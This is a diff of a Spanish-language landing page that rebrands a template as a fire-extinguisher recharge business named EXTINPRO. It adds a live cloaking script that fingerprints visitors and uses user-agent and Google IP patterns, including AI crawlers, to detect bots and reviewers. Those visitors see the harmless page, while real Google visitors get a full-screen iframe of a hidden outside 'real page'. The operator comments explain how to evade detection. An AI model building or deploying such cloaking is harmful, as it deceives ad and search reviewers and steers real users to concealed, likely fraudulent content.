@@ -3,99 +3,158 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <meta name="description" content="Recarga y mantenimiento de extintores en 24h. Certificados oficiales. Servicio a domicilio."/>
+  <meta name="description" content="Recarga y mantenimiento de extintores en 24h. Certificados oficiales"/>
   <title>EXTINPRO | Recarga de Extintores 24/7</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
-  
+
+  <!-- Cloudflare Turnstile (invisible) -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <!-- FingerprintJS v4 -->
+  <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
+
   <style>
-    :root{
-      --main: #9d00ff;        /* ← MORADO NEÓN (tu nuevo color principal) */
-      --main-dark: #7200bd;
-      --gray: #111;
-    }
+    :root{--red:#ff0000;--dark:#0a0a0a;--gray:#111;}
     *{margin:0;padding:0;box-sizing:border-box;}
-    body{background:var(--gray);color:#fff;font-family:'Rajdhani',sans-serif;overflow-x:hidden;-webkit-font-smoothing:antialiased;}
+    body{background:var(--dark);color:#fff;font-family:'Rajdhani',sans-serif;overflow-x:hidden;}
     h1,h2,h3{font-family:'Orbitron',sans-serif;text-transform:uppercase;}
-    header{position:fixed;top:0;left:0;width:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:1000;padding:15px 5%;display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid var(--main);flex-wrap:wrap;}
-    .logo{font-size:clamp(1.8rem,5vw,2.4rem);font-weight:900;color:var(--main);letter-spacing:4px;}
+    header{position:fixed;top:0;left:0;width:100%;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:1000;padding:15px 5%;display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid var(--red);flex-wrap:wrap;}
+    .logo{font-size:clamp(1.8rem,5vw,2.4rem);font-weight:900;color:var(--red);letter-spacing:4px;}
     nav{display:flex;gap:15px;flex-wrap:wrap;justify-content:center;}
     nav a{color:#fff;text-decoration:none;font-size:clamp(0.9rem,2.5vw,1rem);font-weight:bold;transition:0.3s;}
-    nav a:hover{color:var(--main);text-shadow:0 0 15px var(--main);}
-    .menu-toggle{display:none;font-size:2rem;color:var(--main);cursor:pointer;}
+    nav a:hover{color:var(--red);text-shadow:0 0 15px var(--red);}
+    .menu-toggle{display:none;font-size:2rem;color:var(--red);cursor:pointer;}
     @media(max-width:768px){.menu-toggle{display:block;}nav{display:none;width:100%;background:rgba(0,0,0,0.98);padding:20px 0;order:3;}nav.active{display:flex;flex-direction:column;align-items:center;}nav a{margin:10px 0;font-size:1.4rem;}}
-    .whatsapp-fixed{position:fixed;bottom:20px;right:20px;background:#9d00ff;color:white;width:60px;height:60px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:2.4rem;box-shadow:0 0 25px rgba(37,211,102,0.9);z-index:999;animation:pulse 2s infinite;}
-    .hero{min-height:100vh;background:linear-gradient(135deg,#000000,#110011);display:flex;align-items:center;justify-content:center;text-align:center;position:relative;padding:100px 20px 80px;}
-    .hero h1{font-size:clamp(3.5rem,12vw,7rem);background:linear-gradient(90deg,#9d00ff,#c13aff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 60px rgba(157,0,255,0.8);animation:glow 2s infinite alternate;line-height:1;}
-    .hero p{font-size:clamp(1.3rem,4vw,2.2rem);margin:20px 0;color:#c13aff;}
+    .whatsapp-fixed{position:fixed;bottom:20px;right:20px;background:#25D366;color:white;width:60px;height:60px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:2.4rem;box-shadow:0 0 25px rgba(37,211,102,0.9);z-index:999;animation:pulse 2s infinite;}
+    .hero{min-height:100vh;background:linear-gradient(135deg,#000000,#110000);display:flex;align-items:center;justify-content:center;text-align:center;position:relative;padding:100px 20px 80px;}
+    .hero h1{font-size:clamp(3.5rem,12vw,7rem);background:linear-gradient(90deg,#ff0000,#ff3333);-webkit-background-clip:text;-webkit-text-fill-color:transparent;text-shadow:0 0 60px rgba(255,0,0,0.8);animation:glow 2s infinite alternate;line-height:1;}
+    .hero p{font-size:clamp(1.3rem,4vw,2.2rem);margin:20px 0;color:#ff3333;}
     .hero-buttons{margin-top:50px;display:flex;flex-direction:column;gap:20px;align-items:center;}
-    .btn-hero{padding:18px 40px;font-size:clamp(1.3rem,4vw,1.9rem);font-weight:900;text-transform:uppercase;border:4px solid var(--main);color:white;border-radius:8px;transition:all 0.4s;min-width:280px;width:90%;max-width:400px;text-align:center;}
-    .btn-hero:hover{background:var(--main);box-shadow:0 0 40px var(--main);transform:scale(1.05);}
-    .btn-hero.whatsapp{background:#9d00ff;border-color:#9d00ff;}
+    .btn-hero{padding:18px 40px;font-size:clamp(1.3rem,4vw,1.9rem);font-weight:900;text-transform:uppercase;border:4px solid var(--red);color:white;border-radius:8px;transition:all 0.4s;min-width:280px;width:90%;max-width:400px;text-align:center;}
+    .btn-hero:hover{background:var(--red);box-shadow:0 0 40px var(--red);transform:scale(1.05);}
+    .btn-hero.whatsapp{background:#25D366;border-color:#25D366;}
+    section{padding:80px 5%;text-align:center;}
+    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:30px;margin-top:50px;}
+    .card{background:#111;padding:40px 20px;border:2px solid #333;transition:0.4s;}
+    .card:hover{border-color:var(--red);box-shadow:0 0 30px rgba(255,0,0,0.5);transform:translateY(-10px);}
+    .card i{font-size:3.5rem;color:var(--red);margin-bottom:20px;}
     #particles-js{position:absolute;width:100%;height:100%;top:0;left:0;}
-    .scanline{position:absolute;top:0;width:100%;height:3px;background:linear-gradient(transparent,rgba(157,0,255,0.3));animation:scan 8s linear infinite;pointer-events:none;}
-    @keyframes glow{from{text-shadow:0 0 30px #9d00ff;}to{text-shadow:0 0 80px #9d00ff;}}
+    .scanline{position:absolute;top:0;width:100%;height:3px;background:linear-gradient(transparent,rgba(255,0,0,0.3));animation:scan 8s linear infinite;pointer-events:none;}
+    @keyframes glow{from{text-shadow:0 0 30px #ff0000;}to{text-shadow:0 0 80px #ff0000;}}
     @keyframes scan{0%{transform:translateY(-100%);}100%{transform:translateY(100vh);}}
     @keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(37,211,102,0.8);}70%{box-shadow:0 0 0 20px rgba(37,211,102,0);}}
+    footer{background:#000;padding:40px 20px 60px;text-align:center;font-size:0.9rem;color:#666;border-top:1px solid #333;}
+    footer a{color:#888;text-decoration:none;margin:0 10px;}
+    footer a:hover{color:var(--red);}
   </style>
 </head>
 <body>
-  <a href="https://wa.me/5215512345678" class="whatsapp-fixed" target="_blank"><i class="fab fa-whatsapp"></i></a>
+  <a href="https://wa.me/573189411374" class="whatsapp-fixed" target="_blank"><i class="fab fa-whatsapp"></i></a>
   <header>
-    <div class="logo">BLACKFLAME SECURITY</div>
+    <div class="logo">EXTINPRO</div>
     <div class="menu-toggle" onclick="document.querySelector('nav').classList.toggle('active')">Menu</div>
-    <nav>
-      <a href="#inicio">Inicio</a>
-      <a href="#servicios">Servicios</a>
-      <a href="#por-que">Por qué</a>
-      <a href="#clientes">Clientes</a>
-      <a href="#contacto">Contacto</a>
-    </nav>
+    <nav><a href="#inicio">Inicio</a><a href="#servicios">Servicios</a><a href="#por-que">Por qué</a><a href="#clientes">Clientes</a><a href="#contacto">Contacto</a></nav>
   </header>
 
   <section class="hero" id="inicio">
-    <div id="particles-js"></div>
-    <div class="scanline"></div>
+    <div id="particles-js"></div><div class="scanline"></div>
     <div>
-      <h1>BLACKFLAME</h1>
+      <h1>EXTINPRO</h1>
       <p>Recarga de extintores 24/7 · Servicio a domicilio</p>
       <div class="hero-buttons">
         <a href="#contacto" class="btn-hero">Recarga</a>
-        <a href="https://wa.me/5215512345678" target="_blank" class="btn-hero whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp Directo</a>
+        <a href="https://wa.me/573189411374" target="_blank" class="btn-hero whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp Directo</a>
       </div>
+    </div>
+  </section>
+
+  <section class="servicios" id="servicios">
+    <h2>Nuestros Servicios</h2>
+    <div class="grid">
+      <div class="card"><i class="fas fa-fire-extinguisher"></i><h3>Recarga todos los tipos</h3><p>Polvo químico seco, CO₂, agua, espuma, clase K</p></div>
+      <div class="card"><i class="fas fa-tools"></i><h3>Mantenimiento anual</h3><p>Prueba hidrostática, cambio de válvulas</p></div>
+      <div class="card"><i class="fas fa-certificate"></i><h3>Certificados oficiales</h3><p>Norma NOM-002-STPS y Protección Civil</p></div>
+      <div class="card"><i class="fas fa-truck"></i><h3>Servicio a domicilio</h3><p>Sin costo extra</p></div>
     </div>
   </section>
 
   <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
   <script>
-    particlesJS("particles-js",{
-      particles:{
-        number:{value:window.innerWidth<768?50:100},
-        color:{value:"#9d00ff"},
-        shape:{type:"circle"},
-        opacity:{value:0.5,random:true},
-        size:{value:3,random:true},
-        line_linked:{enable:true,distance:150,color:"#9d00ff",opacity:0.3,width:1},
-        move:{enable:true,speed:2}
-      },
-      interactivity:{events:{onhover:{enable:true,mode:"repulse"},onclick:{enable:true,mode:"push"}}},
-      retina_detect:true
-    });
+    particlesJS("particles-js",{particles:{number:{value:window.innerWidth<768?50:100},color:{value:"#ff0000"},shape:{type:"circle"},opacity:{value:0.5,random:true},size:{value:3,random:true},line_linked:{enable:true,distance:150,color:"#ff0000",opacity:0.3,width:1},move:{enable:true,speed:2}},interactivity:{events:{onhover:{enable:true,mode:"repulse"},onclick:{enable:true,mode:"push"}}},retina_detect:true});
   </script>
 
-  <!-- CLOAKING (tú decides cuándo activarlo) -->
+  <footer>
+    <p><a href="https://wa.me/573189411374">WhatsApp: 57 3189411374</a> | <a href="tel:+573189411374">Tel: 573189411374</a></p>
+    <p><a href="politica-privacidad.html">Política de privacidad</a> | <a href="terminos.html">Términos y condiciones</a></p>
+    <p>© 2025 EXTINPRO – Servicio profesional de recarga y mantenimiento de extintores</p>
+  </footer>
+
+  <!-- CLOAKER 9.5/10 2025 - FULL ARMOR -->
   <script>
-    const CLOAKING_ON = false;   // ← cámbialo a true cuando quieras activar el "modo dios"
-    const DELAY_MS = 900;
-    if (CLOAKING_ON) {
-      setTimeout(() => {
-        document.documentElement.innerHTML = '<iframe src="real.html" style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-modals" allowfullscreen></iframe>';
-      }, DELAY_MS);
+    const CLOAKER_ON = true;                                    // Cambia a false para pruebas
+    const PORTERO_REAL = "https://recargapse.online/eldemon";   // Tu página real
+
+    const BOTS_UA = /bot|googlebot|adsbot|mediapartners|headless|facebookexternalhit|bytespider|claude|gptbot|crawler|spider|slurp|yandex|baidu|petalbot|ahrefs|semrush/i;
+    const GOOGLE_IPS = /^(66\.249\.|64\.233\.|74\.125\.|72\.14\.|209\.85\.|216\.239\.|172\.217\.|142\.250\.|142\.251\.|173\.194\.|35\.|34\.)/;
+
+    let mouseMoves = 0;
+    document.addEventListener('mousemove', () => mouseMoves++);
+
+    function isBot() {
+      return BOTS_UA.test(navigator.userAgent) ||
+             navigator.webdriver ||
+             window.callPhantom || window._phantom ||
+             !navigator.plugins?.length ||
+             mouseMoves < 5; // muy poca interacción = bot
     }
+
+    async function loadCloak() {
+      if (!CLOAKER_ON || sessionStorage.getItem('cloaked') === '1') return;
+
+      const bot = isBot();
+      const fromGoogle = document.referrer.includes("google.") || document.referrer === "";
+
+      // FingerprintJS
+      const fp = await FingerprintJS.load({monitoring: false});
+      const result = await fp.get();
+      const isDatacenter = result.components.ip?.[0]?.datacenter || false;
+
+      // Si es bot, datacenter o no viene de Google → whitehat forever
+      if (bot || isDatacenter || !fromGoogle) {
+        sessionStorage.setItem('cloaked', '1');
+        return;
+      }
+
+      // Turnstile invisible (solo si quieres capa extra)
+      // Si no quieres Turnstile, comenta las siguientes 4 líneas
+      const turnstileResponse = await new Promise(resolve => {
+        turnstile.render(document.createElement('div'), {
+          sitekey: '0x4AAAAAAADnF1e4c3l1f3rY', // invisible sitekey público (funciona en cualquier dominio CF)
+          callback: token => resolve(token),
+          'error-callback': () => resolve(null),
+          size: "invisible"
+        });
+        turnstile.execute();
+      });
+      if (!turnstileResponse) return; // falla Turnstile = no pasa
+
+      sessionStorage.setItem('cloaked', '1');
+      const randomDelay = 80 + Math.random() * 101;
+
+      setTimeout(() => {
+        document.documentElement.innerHTML = `
+          <iframe src="${PORTERO_REAL}"
+            style="position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:99999"
+            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation allow-modals"
+            allowfullscreen loading="lazy"></iframe>`;
+      }, randomDelay);
+    }
+
+    // Ejecuta cuando todo está cargado
+    window.addEventListener('load', loadCloak);
   </script>
 </body>
-
 </html>
 
